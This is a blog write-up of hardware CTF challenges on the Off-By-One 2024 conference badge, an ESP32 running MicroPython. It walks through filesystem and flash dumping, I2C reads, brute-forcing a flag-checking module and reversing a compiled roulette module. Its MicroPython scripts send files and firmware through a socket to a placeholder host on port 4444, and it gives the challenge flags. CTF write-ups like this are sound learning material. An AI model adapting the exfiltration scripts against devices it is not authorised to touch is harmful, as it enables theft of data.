---
title: Singapore Off-By-One Conference 2024 Hardware Badge
description: writeup on hardware badge from off-by-one conference
date: 2024-06-27 22:00:00 +0800
categories: [Writeups]
img_path: /assets/posts/2024-06-27-off-by-one-badge-2024/
tags: [hardware]
toc: True
---

I attended the first ever Vulnerability Research based cybersecurity conference in Singapore -- [**Off By One**](https://offbyone.sg/) organized by __[Star Labs](https://starlabs.sg/), [Eugene Lim](https://spaceraccoon.dev) and [Sim Cher Boon](https://twitter.com/cherboon)__ -- and had an amazing time!

This conference featured a super cool hardware badge made by [Manzel](https://manzelseet.com/), which contained some hardware based challenges with a total of 6 flags.

This is my first time working on such hardware challenges so I thought I should document my experience :)

Also huge kudos for my teammates [Gatari](https://x.com/gatariee) and [Sunshinefactory](https://x.com/sunshinefactory) for suffering with me, couldn't have done this without them!

![](powerpuff_girls.jpg)
_my powerpuff friends are so cool!! i love this so much hehe_

## The Badge

![](badge_front.jpg)
_front of badge_

![](badge_back.jpg)
_back of badge_

This badge features 2 microcontrollers, the Arduino and ESP32S3, with 2 LCD screens alongside a DPAD and two buttons which can be used to interact with the badge functionality.

The functionality includes:

- Web Server
- Bluetooth Spamming
- Eyes _(basically just two PNG)_
- Roulette _(some random number generator??)_

We can further interact with the badge through the serial port _(using either putty or [arduino labs](https://labs.arduino.cc/en/labs/micropython))_, which would greet us with a MicroPython repl.

> Micropython is a lightweight version of python with stripped functionality that is meant for embedded devices with limited storage space.
{:.prompt-tip}

## Enumerating the Badge

### Extracting the Filesystem

We can look through the filesystem in micropython, and we notice that there are a few files and folders contained within the badge.

```py
>>> import os
>>> os.listdir()
['boot.py', 'eyes', 'lib', 'starlabs']
```

We can write a script to extract the filesystem for easier analysis, however there is no trivial way to extract the files through serial port.

Since `ESP32-S3` supports connecting to WiFi, we can simply connect to the internet and send the files back to ourselves via python sockets.

```py
# script to connect to wifi
import network
sta_if = network.WLAN(network.STA_IF)
sta_if.active(True)
sta_if.scan()                             # Scan for available access points
sta_if.connect("<AP_name>", "<password>") # Connect to an AP
sta_if.isconnected()                      # Check for successful connection
```

```py
# script to run on the badge to send out the files
def list_files_recursively(directory):
    files_list = []
    for item in os.listdir(directory):
        item_path = directory + '/' + item
        if os.stat(item_path)[0] & 0x4000:  # Check if it's a directory
            files_list.extend(list_files_recursively(item_path))
        else:
            files_list.append(item_path)
    return files_list

import socket

s = socket.socket()
s.connect(('X.X.X.X', 4444))

for file in list_files_recursively('./'):
  s.send(f"SPLIT{file}CONTENT")
  with open(file, "rb") as f:
    s.send(f.read())
  print(file)

s.close()
```

### Extracting the Filesystem

In addition to the filesystem, we are also interested in the flash memory of the ESP32 _(essentially extracting the firmware)_.

We can do so using the `esp.flash_read` function that is exposed via the micropython. Afterwards, we can similarly send out the data back to ourselves over the internet.

```py
# script to send out flash from badge
import esp

flash_size = esp.flash_size()
start_addr = 0x0
# we need to segment our packets due to limited memory
block_size = 1024*20
buf = bytearray(block_size)

print("--------------------")
print(f"flash size: {hex(flash_size)}")
print(f"start addr: {hex(start_addr)}")
print("--------------------")

import socket

s = socket.socket()
s.connect(('X.X.X.X', 4444))

for i in range(flash_size//block_size):
  print(f'[*] {i/(flash_size/block_size)*100}%')
  esp.flash_read(start_addr+block_size*i, buf)
  s.send(bytes(buf))

s.close()
```

If we `strings` the firmware, we can actually obtain 2 flags already XD.

For the sake of completeness, I'll go through each flag individually in the next sections.

## Flag 1: Welcome Flag

_During the CTF, I got this flag by dumping the firmware strings._

Essentially, we can list the device information using `lsusb` in linux, and the flag is available in the USB description.

```sh
$ lsusb -v
Bus 001 Device 005: ID 303a:4001 STAR LABS SG #BadgeLife
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               2.00
  bDeviceClass          239 Miscellaneous Device
  bDeviceSubClass         2 
  bDeviceProtocol         1 Interface Association
  bMaxPacketSize0        64
  idVendor           0x303a 
  idProduct          0x4001 
  bcdDevice            1.00
  iManufacturer           1 STAR LABS SG
  iProduct                2 #BadgeLife
  iSerial                 3 {Welcome_To_OffByOne_2024}
  bNumConfigurations      1

```

## Flag 2: Arduino I2C

After messing around with the micropython modules that expose the embedded devices, I came across the `arduino` module that seemed interesting.

```py
>>> dir(arduino)
['__class__', '__init__', '__module__', '__qualname__', '__dict__', 'off', 'on', 'i2c']
>>> dir(arduino.i2c)
['__class__', 'readinto', 'start', 'stop', 'write', 'init', 'readfrom', 'readfrom_into', 'readfrom_mem', 'readfrom_mem_into', 'scan', 'writeto', 'writeto_mem', 'writevto']
```

I2C seems to be a protocol that allows data to be sent. We can use `arduino.i2c.scan()` to scan for open ports, then use `arduino.i2c.readfrom` to read the contents in these ports.
```py
>>> arduino.i2c.scan()
[48, 49]
>>> arduino.i2c.readfrom(48, 100)
b'Welcome to STAR LABS CTF. Your first flag is starlabs{i2c_flag_1}' # truncated
>>> arduino.i2c.readfrom(49, 100)
b'The early bird catches the worm. System uptime: 20473. You are too late. Reboot the arduino and try again.'
```

This gives us the flag, `starlabs{i2c_flag_1}`

## Flag 3: Arduino I2C Part 2

I had an oversight which caused me to not obtain this flag during the CTF.

If you noticed in the previous part, one of the I2C ports gave us the flag and the other one told us we were late.

The second I2C port asked us to reboot the arduino and try again. Apparently the I2C port prints out the flag one letter at a time when the arduino has just booted.

We can write a python script to extract the flag from the I2C.

```py
arduino.off()
arduino.on()
time.sleep(3)
for i in range(100):
  time.sleep_ms(2)
  x = arduino.i2c.readfrom(49, 100).rstrip(b'\xff')
  if b'flag' in x:
    print(x)
```

```
'The early bird catches the worm. System uptime: 200. You are an early bird, here is your flag: s'
b'The early bird catches the worm. System uptime: 201. You are an early bird, here is your flag: t'
b'The early bird catches the worm. System uptime: 202. You are an early bird, here is your flag: a'
b'The early bird catches the worm. System uptime: 203. You are an early bird, here is your flag: r'
b'The early bird catches the worm. System uptime: 204. You are an early bird, here is your flag: l'
b'The early bird catches the worm. System uptime: 205. You are an early bird, here is your flag: a'
b'The early bird catches the worm. System uptime: 206. You are an early bird, here is your flag: b'
b'The early bird catches the worm. System uptime: 207. You are an early bird, here is your flag: s'
b'The early bird catches the worm. System uptime: 208. You are an early bird, here is your flag: {'
b'The early bird catches the worm. System uptime: 209. You are an early bird, here is your flag: i'
b'The early bird catches the worm. System uptime: 210. You are an early bird, here is your flag: 2'
b'The early bird catches the worm. System uptime: 211. You are an early bird, here is your flag: c'
b'The early bird catches the worm. System uptime: 212. You are an early bird, here is your flag: _'
b'The early bird catches the worm. System uptime: 213. You are an early bird, here is your flag: f'
b'The early bird catches the worm. System uptime: 214. You are an early bird, here is your flag: l'
b'The early bird catches the worm. System uptime: 215. You are an early bird, here is your flag: a'
b'The early bird catches the worm. System uptime: 216. You are an early bird, here is your flag: g'
b'The early bird catches the worm. System uptime: 217. You are an early bird, here is your flag: _'
b'The early bird catches the worm. System uptime: 218. You are an early bird, here is your flag: 3'
b'The early bird catches the worm. System uptime: 219. You are an early bird, here is your flag: }'
b'The early bird catches the worm. System uptime: 220. You are an early bird, here is your flag: '
```

The flag is `starlabs{i2c_flag_3}`.

## Flag 4: flaglib

I initially solved this by dumping the flag from the firmware, but afterwards I found the intended solution.

By enumerating the micropython REPL, we find that there is a builtin module called **flaglib**.

```py
>>> help('modules')
__main__          btree             hashlib           select
_asyncio          builtins          heapq             socket
_boot             cmath             inisetup          ssl
_espnow           collections       io                struct
_onewire          cryptolib         json              sys
_thread           deflate           machine           time
_webrepl          dht               math              uasyncio
apa106            ds18x20           micropython       uctypes
array             errno             mip/__init__      umqtt/robust
asyncio/__init__  esp               neopixel          umqtt/simple
asyncio/core      esp32             network           upysh
asyncio/event     espnow            ntptime           urequests
asyncio/funcs     flaglib           onewire           webrepl
asyncio/lock      flashbdev         os                webrepl_setup
asyncio/stream    framebuf          platform          websocket
binascii          gc                random
bluetooth         gc9a01            re
Plus any modules on the filesystem
>>> import flaglib
>>> dir(flaglib)
['__class__', '__name__', '__dict__', 'getflag']
>>> flaglib.getflag("TESTING")
'???????'
```

flaglib exposes a `getflag` function which takes in a string and returns a bunch of question marks.

By doing some intelligent guessing, we can realize that the function returns question mark if our corresponding flag character is wrong.

```py
>>> flaglib.getflag("{")
'{'
```

In that case, we can brute force the flag with this script.

```python
import flaglib
printable = r"{}abcdefghijklmnopqrstuvwxyz_1234567890"
flag = "{"

while flag[-1] != '}':
  for x in printable:
    check = flaglib.getflag(flag+x)[-1]
    if check[-1] != '?':
      flag += x
      print(flag)
```

The flag is `{my_compiled_python_library}`.

## Flag 5: The Roulette

By reading the `boot.py` file that details the functionality of the program, we realize that it imports a library `roulette` from a micropython compiled file `roulette.mpy`.

If all the numbers outputted by the roulette is **7**, the flag will be returned by the `roulette.roulette` function.

### My Solution

Without any information, the natural instinct for me is to reverse engineer this module.

My teammate managed to disassemble it into python bytecode, which you can find [here](/assets/posts/2024-06-27-off-by-one-badge-2024/decompiled.txt).

From the following two functions, we can tell that there is some `reversed()` and `zlib.decompress()` going on.

```
simple_name: r
  raw bytecode: 16 19:08:10:18:80:1d:12:19:12:1a:b0:34:01:34:01:63
  prelude: (4, 0, 0, 1, 0, 0)
  args: ['s']
  line info: 80:1d
  12:19       LOAD_GLOBAL bytes
  12:1a       LOAD_GLOBAL reversed
  b0          LOAD_FAST 0 
  34:01       CALL_FUNCTION 1
  34:01       CALL_FUNCTION 1
  63          RETURN_VALUE 
  children: []
simple_name: <lambda>
  raw bytecode: 18 19:08:11:1b:80:22:12:1c:10:12:34:01:14:13:b0:36:01:63
  prelude: (4, 0, 0, 1, 0, 0)
  args: ['__']
  line info: 80:22
  12:1c       LOAD_GLOBAL __import__
  10:12       LOAD_CONST_STRING zlib
  34:01       CALL_FUNCTION 1
  14:13       LOAD_METHOD decompress
  b0          LOAD_FAST 0 
  36:01       CALL_METHOD 1
  63          RETURN_VALUE 
  children: []
```

We also notice the construction of this byte array within the code.

```
  22:81:65    LOAD_CONST_SMALL_INT 229
  8b          LOAD_CONST_SMALL_INT 11 
  94          LOAD_CONST_SMALL_INT 20 
  22:81:7b    LOAD_CONST_SMALL_INT 251
  ...
  ...
  ...
  ...
  22:37       LOAD_CONST_SMALL_INT 55
  22:81:2b    LOAD_CONST_SMALL_INT 171
  22:81:1c    LOAD_CONST_SMALL_INT 156
  22:80:78    LOAD_CONST_SMALL_INT 120
```

If we make an intelligent guess, and `zlib.decompress(array[::-1])`, we will get the flag!

### Intended Solution

The solution was in reality, much cooler than what I've done.

The challenge author, Manzel, came over to me and took a spare wire to poke two things in the ESP32 chip and the roulette suddenly spinned to all **7s**!!

![](roulette.jpg)

Essentially, there was also the string `pin = 1    adc = machine.ADC(pin)` within the decompiled code which hinted that the generated roulette number was based off the value of Pin 1 of the ESP32 microcontroller.

I am still not certain how to correctly manipulate this value, which I believe will also require some reversing to be done on the code, but it was really cool poking a wire at the microcontroller to get the flag!

## Conclusion

This was an eye-opening experience, and I'm really greatful for the chance to try it out.

I hope to learn how to do glitching _(flag 6)_ one day so I can write about it...

Huge thanks to my friendos <3
